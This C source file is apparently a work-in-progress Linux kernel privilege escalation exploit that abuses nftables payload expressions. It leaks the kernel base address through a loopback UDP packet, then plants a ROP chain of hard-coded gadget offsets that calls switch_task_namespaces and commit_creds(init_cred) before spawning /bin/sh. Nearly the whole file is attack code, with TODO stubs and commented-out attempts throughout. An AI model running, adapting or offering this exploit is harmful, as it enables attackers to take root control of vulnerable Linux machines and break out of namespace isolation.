#define _GNU_SOURCE
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>
#include "utils.h"
#define BUF_SIZE 0x260
//////////edit////////////
typedef struct udp_data {
	char* data;
	size_t size;
	uint16_t port;
	char* addr;
	size_t addr_size;
} udp_data;

typedef struct listener_data {
	uint16_t port;
	char address[8];
} listener_data;
/////////////////////

static struct nftnl_rule *isolate_udp_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// meta load l4proto => reg 1 
	add_meta(r, NFT_META_L4PROTO, NFT_REG_1); 

    // TODO
	return r;
}

static struct nftnl_rule *edit_udp_data(uint8_t family, const char *table, const char *chain)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}
	
	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
	
	// *** PREPARE PAYLOAD SET EXPRESSION ***
	// This expression will be used to get the address from a register and write it
	// into the packet
	uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
	uint32_t payload_offset = 8; // we set the offset to after the UDP header.
	uint32_t payload_len = 0x20; // 8 bytes -> the address
	uint32_t payload_sreg = 0xfffffffc; // we get it from the first register

	add_payload_set(r, payload_base, payload_offset, payload_len, payload_sreg);
//	add_payload(r, payload_base, 0, 0xffffffe8, 0x28, 0x70);
	printf("[*] Payload expression is setup! \n");

	// TODO
	return r;
}

static struct nftnl_rule *edit_udp_data2(uint8_t family, const char *table, const char *chain)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}
	
	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
	
	// *** PREPARE PAYLOAD SET EXPRESSION ***
	// This expression will be used to get the address from a register and write it
	// into the packet
	uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
//	uint32_t payload_offset = 8; // we set the offset to after the UDP header.
//	uint32_t payload_len = 0x20; // 8 bytes -> the address
//	uint32_t payload_sreg = 0xfffffffc; // we get it from the first register

//	add_payload_set(r, payload_base, payload_offset, payload_len, payload_sreg);
	add_payload(r, payload_base, 0, 0xffffffda, 0x28, 0xe0);
	printf("[*] Payload expression is setup! \n");

	// TODO
	return r;
}

void install_rule_for_leak()
{
	//if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, "filter", "input", "leak")) == 0 ){
	//	perror("error creating rule");
	//	exit(EXIT_FAILURE);
	//}
	if(create_rule(edit_udp_data(NFPROTO_IPV4, "filter", "input")) == 0 ){
		perror("error creating rule");
		exit(EXIT_FAILURE);
	}
}



void install_rule_for_leak2()
{
	//if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, "filter", "input", "leak")) == 0 ){
	//	perror("error creating rule");
	//	exit(EXIT_FAILURE);
	//}
	if(create_rule(edit_udp_data2(NFPROTO_IPV4, "filter", "input")) == 0 ){
		perror("error creating rule");
		exit(EXIT_FAILURE);
	}
}
void udp_client(void * data){
    // TODO
	struct udp_data dummy_data;
	char* As = data;
	char* dest_addr = "127.0.0.1";
	dummy_data.data = As;
	dummy_data.size = BUF_SIZE;//sizeof(dummy_data.data) / sizeof(char);
	dummy_data.port = 50005;
	dummy_data.addr = dest_addr;
	dummy_data.addr_size = sizeof(dummy_data.addr);
	udp_data* udata = &dummy_data;

	size_t size = udata->size;
	char* sending_data = udata->data;
	uint16_t sending_port = udata->port;

	int sock;
	struct sockaddr_in addr;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	printf("[-]Client Generated socket\n");
	addr.sin_family = AF_INET;
	addr.sin_port = htons(sending_port);
	addr.sin_addr.s_addr = inet_addr(dest_addr);

	sendto(sock, sending_data, size, 0, (struct sockaddr*)&addr, sizeof(addr));
	printf("[-]Client Send data to server\n");
	printf("Data: \n");
//	hexdump(sending_data, size);
	printf("End Client Data\n");
	close(sock);


}

void udp_server(void * data){
    // TODO
	struct listener_data ldata;
	ldata.port = 50005;
	bzero(ldata.address, 8);

	uint16_t port = ldata.port;

	//char message[8];
	//bzero(message, 8);
	int bytes;
	int ret;

	int soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	printf("[-]Server Socket generated\n");

	if (soc < 0) {
		perror("[!] Error setting up UDP socket");
		exit(EXIT_FAILURE);
	}

	int reuse_address = 1;

	setsockopt(soc, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof reuse_address);
	printf("[-]Server: set socket opt\n");
	struct sockaddr_in addr;
	inet_aton("127.0.0.1", &addr.sin_addr);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);


	ret = bind(soc, (struct sockaddr*)&addr, sizeof(addr));
	if (ret < 0) {
		perror("[!] Problem binding");
		exit(EXIT_FAILURE);
	}
	printf("[*] Listening on port %d \n", port);
	//bytes = recvfrom(soc, (char*)message, sizeof message, MSG_WAITALL, (struct sockaddr*)&addr, sizeof(addr));
	//message[bytes] = '\0';
	while ((bytes = read(soc, data, BUF_SIZE)) > 0) {
		printf("[-]Server recieved %d bytes", bytes);
//		hexdump(data, bytes);
		break;
	}
	//memcpy(&ldata->address, &message, 16);
	pthread_exit(NULL);

}
///////////////////////////////////////
extern void get_shell(){
	system("id");
	system("/bin/sh");
}

//unsigned long user_cs, user_ss, user_sp, user_rflags;
//void save_userland_registers(){
// __asm__(
//		".intel_syntax noprefix;"
//		"mov user_cs, cs;" // saves the cs register
//		"mov user_ss, ss;" // saves the ss register
//		"mov user_sp, rsp;" // saves the stack pointer
//		"pushf;" // pushes the flags on the stack
//		"pop user_rflags;" // pops the flags from the stack to user_rflags
//		".att_syntax;"
//);
//	puts("[*] Saved userland registers");
//	printf("[#] cs: 0x%lx \n", user_cs);
//	printf("[#] ss: 0x%lx \n", user_ss);
//	printf("[#] rsp: 0x%lx \n", user_sp);
//	printf("[#] rflags: 0x%lx \n\n", user_rflags);
//
//}

//////////////////////////////////////////
int main(int argc, char *argv[])
{

	pin_cpu(0);	
    int tid, status;
    pthread_t p_thread;
    unsigned char udpbuf[BUF_SIZE] = {0,};
	uint64_t* udpbuf2[BUF_SIZE/8] = {0, };
	unsigned long kernel_base = 0;
	uint64_t kb_leak_addt_offset = 0x1e060d8;

	uint64_t leaked_addr = 0;
	uint64_t bpf_get_current_task = 0;
	uint64_t init_cred = 0;
	uint64_t commit_creds = 0;
	uint64_t switch_task_namespaces = 0;
	uint64_t init_nsproxy = 0;
	uint64_t cr4 = 0;
	uint64_t cr4_offset = 0xffffffff81051e70 - 0xffffffff81000000;

	uint64_t bpf_get_current_task_off = 0x217de0;
	uint64_t init_cred_off = 0x1e8a2a0;
	uint64_t commit_creds_off = 0xe74a0;
	uint64_t switch_task_namespaces_off = 0xe5c80;
	uint64_t init_nsproxy_off = 0x1e8a060;
	uint64_t pop_rsi_ret = 0;
	uint64_t pop_rsi_ret_off = 0xffffffff810fd61e - 0xffffffff81000000;
	uint64_t mov_rdi__rax_ret = 0;
	uint64_t mov_rdi__rax_ret_off = 0xffffffff81625d74 - 0xffffffff81000000;
	uint64_t pop_rbx_pop_rdi_ret = 0;
	uint64_t pop_rbx_pop_rdi_ret_off = 0xffffffff8165ca3b - 0xffffffff81000000;
	uint64_t pop_rbp_ret = 0;
	uint64_t pop_rbp_ret_off = 0xffffffff8116362b - 0xffffffff81000000;
	uint64_t ret = 0;
	uint64_t ret_off = 0xffffffff810870df - 0xffffffff81000000;
	uint64_t cli_ret_off = 0xffffffff81015ca0 - 0xffffffff81000000;
	uint64_t cli_ret = 0;
	uint64_t swapgs_restore_off =  0xffffffff81e010a7  - 0xffffffff81000000;
	uint64_t swapgs_restore = 0;
	uint64_t xor_rax_rax = 0;
	uint64_t xor_rax_rax_off = 0xffffffff812ea5f6 - 0xffffffff81000000;
	uint64_t __do_soft_irq_end = 0;
	uint64_t __do_soft_irq_end_off = 0xffffffff810bd765 - 0xffffffff81000000;
	uint64_t add_rsp = 0;
	uint64_t add_rsp_off = 0xffffffff81673af1 - 0xffffffff81000000;
	uint64_t pop_r14_rbp_ret_off = 0xffffffff811c0c4e - 0xffffffff81000000;
	uint64_t pop_r14_rbp_ret = 0;
	uint64_t __do_soft_irq = 0;
	uint64_t __do_soft_irq_off =0xffffffff82000000 - 0xffffffff81000000;
	uint64_t push_rsp_add_rsp0x28_p_p_p_rbp_ret = 0;
	uint64_t push_rsp_add_rsp0x28_p_p_p_rbp_ret_off = 0xffffffff81c268dc - 0xffffffff81000000;
	uint64_t pop_rdx_ret = 0;
	uint64_t pop_rdx_ret_off = 0xffffffff81066a40 - 0xffffffff81000000;
    memset(udpbuf, 0x41, BUF_SIZE);
    new_ns();

    system("ip link set lo up");

	printf("[+] Leak kernel base address\n");
	printf("  [-] install udp server\n");

    tid = pthread_create(&p_thread, NULL, udp_server, (void *)udpbuf);
    if (tid < 0){
        perror("thread create error : ");
        exit(0);
    }

	printf("  [-] setup nftables\n");

	if(create_table(NFPROTO_IPV4, "filter", false) == 0){
		perror("error creating table");
		exit(EXIT_FAILURE);
	}

	//if(create_chain("filter", "input", NF_INET_LOCAL_IN) == 0){
	//	perror("error creating chain");
	//	exit(EXIT_FAILURE);
	//}

	if(create_chain("filter", "input", NF_INET_LOCAL_IN) == 0){
		perror("error creating chain");
		exit(EXIT_FAILURE);
	}

    install_rule_for_leak();

	printf("  [-] send & recv udp packet\n");

	usleep(1000);
    udp_client(udpbuf);

    pthread_join(p_thread, (void **)&status);
	printf("Data AFter Join: \n");

	////////edit///////////
	hexdump(udpbuf, BUF_SIZE);
	///////////////////
	// kernel_base = ??i;
	strncpy((char*)&leaked_addr, udpbuf, 16);
	printf("leaked_addr: %p\n", leaked_addr);
	kernel_base = leaked_addr - kb_leak_addt_offset;
	printf("  [-] kernel base address %p\n", kernel_base);
			
    memset((unsigned char*)udpbuf2, 0x41, BUF_SIZE);
//	save_userland_registers();
	bpf_get_current_task = kernel_base + bpf_get_current_task_off;
	pop_rbx_pop_rdi_ret = kernel_base + pop_rbx_pop_rdi_ret_off;
	cr4 = kernel_base + cr4_offset;
	mov_rdi__rax_ret = kernel_base + mov_rdi__rax_ret_off;
	init_nsproxy = kernel_base + init_nsproxy_off;
	switch_task_namespaces = kernel_base + switch_task_namespaces_off;
	init_cred = kernel_base + init_cred_off;
	commit_creds = kernel_base + commit_creds_off;
	ret = kernel_base + ret_off;
	pop_rbp_ret = kernel_base + pop_rbp_ret_off;
	pop_rsi_ret = kernel_base + pop_rsi_ret_off;
	cli_ret = kernel_base+cli_ret_off;
	swapgs_restore = kernel_base + swapgs_restore_off;
	xor_rax_rax = kernel_base + xor_rax_rax_off;
	__do_soft_irq_end = kernel_base + __do_soft_irq_end_off;
	add_rsp = kernel_base + add_rsp_off;
	pop_r14_rbp_ret = kernel_base + pop_r14_rbp_ret_off;
	__do_soft_irq = kernel_base + __do_soft_irq_off;
	push_rsp_add_rsp0x28_p_p_p_rbp_ret = kernel_base + push_rsp_add_rsp0x28_p_p_p_rbp_ret_off;
	pop_rdx_ret = kernel_base + pop_rdx_ret_off;
//	*((uint64_t* )udpbuf2 + 4) = pop_rbx_pop_rdi_ret;
//	*((uint64_t* )udpbuf2 + 5) = 0;
//	*((uint64_t* )udpbuf2 + 6) = 0x6f0;
	*((uint64_t* )udpbuf2 + 4) = cli_ret;
	*((uint64_t* )udpbuf2 + 5) = pop_rdx_ret;
	*((uint64_t* )udpbuf2 + 6) = 0x400100;
	*((uint64_t* )udpbuf2 + 7) = __do_soft_irq + 414;
	*((uint64_t* )udpbuf2 + 8) = 0;
	*((uint64_t* )udpbuf2 + 9) = 0;
	*((uint64_t* )udpbuf2 + 10) = 0;
	*((uint64_t* )udpbuf2 + 11) = 0;
	*((uint64_t* )udpbuf2 + 12) = 0;
	*((uint64_t* )udpbuf2 + 13) = 0;
	*((uint64_t* )udpbuf2 + 14) = 0;
	*((uint64_t* )udpbuf2 + 15) = 0;
	*((uint64_t* )udpbuf2 + 16) = 0;
	*((uint64_t* )udpbuf2 + 17) = 0;
	*((uint64_t* )udpbuf2 + 18) = 0;
	*((uint64_t* )udpbuf2 + 19) = xor_rax_rax;
	*((uint64_t* )udpbuf2 + 20) = bpf_get_current_task;
	*((uint64_t* )udpbuf2 + 21) = mov_rdi__rax_ret;
	*((uint64_t* )udpbuf2 + 22) = pop_rsi_ret;
	*((uint64_t*)udpbuf2 + 23) = init_nsproxy;
	*((uint64_t*)udpbuf2 +24) = switch_task_namespaces;
	*((uint64_t*)udpbuf2 + 25) = pop_rbx_pop_rdi_ret;
	*((uint64_t*)udpbuf2 + 26)= 0;
	*((uint64_t*)udpbuf2 + 27) = init_cred;
	*((uint64_t*)udpbuf2 + 28) = commit_creds;
	*((uint64_t* )udpbuf2 + 29) = ret;
	*((uint64_t* )udpbuf2 + 30) = ret;
	*((uint64_t* )udpbuf2 + 31) = push_rsp_add_rsp0x28_p_p_p_rbp_ret;


//	*((uint64_t* )udpbuf2 + 15) = ret;
//	*((uint64_t* )udpbuf2 + 16) = ret;
//	*((uint64_t* )udpbuf2 + 17) = ret;
//	*((uint64_t* )udpbuf2 + 18) = pop_rbp_ret;
//	*((uint64_t*)udpbuf2 + 17) = cli_ret;
//	*((uint64_t*)udpbuf2 + 17) = swapgs_restore;
//	*((uint64_t*)udpbuf2 + 19) = 0;
//	*((uint64_t*)udpbuf2 + 20) = 0;
//	*((uint64_t*)udpbuf2 + 18) = get_shell;
//	*((uint64_t*)udpbuf2 + 22) = user_cs;
//	*((uint64_t*)udpbuf2 + 23) = user_rflags;
//	*((uint64_t*)udpbuf2 + 24) = user_sp;
//	*((uint64_t*)udpbuf2 + 25) = user_ss;




//	hexdump(udpbuf2, BUF_SIZE);

	tid = pthread_create(&p_thread, NULL, udp_server, (void *)udpbuf2);
    if (tid < 0){
        perror("thread create error : ");
        exit(0);
    }

	printf("  [-] setup nftables\n");

	//if(create_chain("filter", "input", NF_INET_LOCAL_IN) == 0){
	//	perror("error creating chain");
	//	exit(EXIT_FAILURE);
	//}


    install_rule_for_leak2();

	printf("  [-] send & recv udp packet\n");

	usleep(1000);
    udp_client(udpbuf2);

    pthread_join(p_thread, (void **)&status);
	printf("Finish \n");
	get_shell();
	return 0;
}
